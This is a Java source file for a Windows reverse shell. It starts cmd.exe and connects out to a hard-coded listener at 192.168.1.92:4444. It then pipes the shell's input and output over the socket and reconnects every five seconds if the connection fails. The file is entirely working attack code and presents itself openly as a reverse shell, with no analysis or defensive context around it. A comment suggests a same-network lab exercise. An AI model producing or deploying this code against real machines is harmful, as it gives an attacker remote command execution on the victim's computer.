package NetworkShell;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;

//connects to reverse shell within same network

public class ShellConnector {

    public static void main() {
        boolean ConnectingToHost = true;
        InetAddress myIp = null;//discover IP
        try {
            myIp = InetAddress.getLocalHost();
        } catch (UnknownHostException e) {
            throw new RuntimeException(e);
        }
        String host = "192.168.1.92";//Listener IP
        int port = 4444; //Listener port
        System.out.println("Device IP:" + myIp);
        System.out.println("Attempting to connect to: " + host + ":" + port);
        while (ConnectingToHost) {
            try {

                //run cmd.exe
                Process process = new ProcessBuilder("cmd.exe").redirectErrorStream(true).start();

                Socket socket = new Socket(host, port);
                InputStream processInput = process.getInputStream();
                OutputStream processOutput = process.getOutputStream();
                InputStream socketInput = socket.getInputStream();
                OutputStream socketOutput = socket.getOutputStream();

                while (!socket.isClosed()) {
                    while (processInput.available() > 0) {
                        socketOutput.write(processInput.read());
                    }

                    while (socketInput.available() > 0) {
                        processOutput.write(socketInput.read());
                    }

                    socketOutput.flush();
                    processOutput.flush();

                    try {
                        process.exitValue();
                        break;
                    } catch (Exception ignored) {
                    }

                    Thread.sleep(50);
                }

                process.destroy();
                socket.close();
                System.out.println("Shell closed");

            }catch(Exception e){
                System.err.println("Reverse shell error: " + e.getMessage());
                try {
                    Thread.sleep(5000);
                } catch (InterruptedException ex) {
                    throw new RuntimeException(ex);
                }
            }
        }
       }
    }
